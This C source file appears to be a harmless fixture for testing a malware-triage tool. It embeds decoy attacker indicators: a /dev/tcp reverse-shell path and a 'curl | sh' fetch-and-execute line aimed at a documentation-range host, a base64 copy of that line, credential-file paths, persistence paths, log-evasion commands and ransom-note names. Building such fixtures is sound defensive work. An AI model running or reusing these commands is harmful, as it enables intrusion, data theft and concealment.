/* imposter.c — synthetic indicator stub, built as a shared object.
 * declares system symbols it never calls, carries decoy strings,
 * decodes to nothing. exists so analysts can exercise husk without
 * touching real malware. harmless by construction.
 */
#include <stddef.h>

/* undefined symbol anchors: force dynamic imports without calls */
extern void ptrace(void);
extern void io_uring_setup(void);
extern void io_uring_enter(void);
extern void process_vm_readv(void);

volatile void *husk_anchors[4];

__attribute__((constructor))
static void husk_anchor(void)
{
    husk_anchors[0] = (void *)ptrace;
    husk_anchors[1] = (void *)io_uring_setup;
    husk_anchors[2] = (void *)io_uring_enter;
    husk_anchors[3] = (void *)process_vm_readv;
}

/* decoy strings: each family husk watches, RFC 5737 / RFC 2606 hosts only */
static const char *const decoys[] = {
    "/proc/self/status",
    "TracerPid:\t000",
    "/etc/cron.d/flush-sync",
    "crontab -l",
    "/etc/systemd/system/net-sync.service",
    "systemctl restart net-sync",
    "/root/.ssh/authorized_keys",
    "[kworker/0:1]",
    "[ksoftirqd/7]",
    "/etc/shadow",
    "/etc/passwd",
    "insmod /tmp/mod.ko",
    "/proc/kallsyms",
    "/dev/tcp/192.0.2.10/4444",
    "stratum+tcp://pool.example.org:3333",
    ".encrypted",
    "readme_for_decrypt.txt",
    "your files have been indexed",
    "4ctulhut9xqvvvkq1uvcopgqac2g5nvtcjkrsxkzd7mkah6qhnvq5ybmnbyhz5yc9prc9xsn"
    "qzthtlvqra10",
    "onion3gyq6f3xplbs7n2o7zhcquldlbxbtzqefmrjwznqrpij76gev5ad.onion",
    "Login Data",
    "kwallet5",
    "curl -fsSL http://192.0.2.10/px.sh | sh",
    "sentinelone",
    "crowdstrike",
    "kill -9",
    "unset HISTFILE",
    "LD_PRELOAD=",
    "/etc/ld.so.preload"
};

volatile const char *husk_decoy_ref = decoys[0];
volatile int husk_decoy_sum = 0;

/* anchor every decoy: without this the optimizer drops unused literals */
__attribute__((constructor))
static void husk_keep_decoys(void)
{
    int i;
    unsigned s = 0;
    for (i = 0; i < (int)(sizeof(decoys) / sizeof(decoys[0])); i++) {
        const char *d = decoys[i];
        while (*d) s += (unsigned char)*d++;
    }
    husk_decoy_sum = (int)s;
}

/* base64 blob: decodes to a fetch-and-execute one-liner (synthetic host) */
static const char husk_blob[] =
    "ZWNobyB3YWl0OyBjdXJsIC1mc1NMIGh0dHA6Ly8xOTIuMC4yLjEwL3B4LnNoIHwgc2g7ICMg"
    "c3ludGhldGljIGZpeHR1cmUgZm9yIGh1c2sgdHJpYWdlIGRlbW9uc3RyYXRpb24gb25seSBu"
    "byByZWFsIGVuZHBvaW50IGlzIGNvbnRhY3RlZCBieSB0aGlzIGRhdGEgIyBzZWUgcGF5bG9h"
    "ZCBmb3IgZGV0YWlscyAj";

volatile const char *husk_blob_ref = husk_blob;
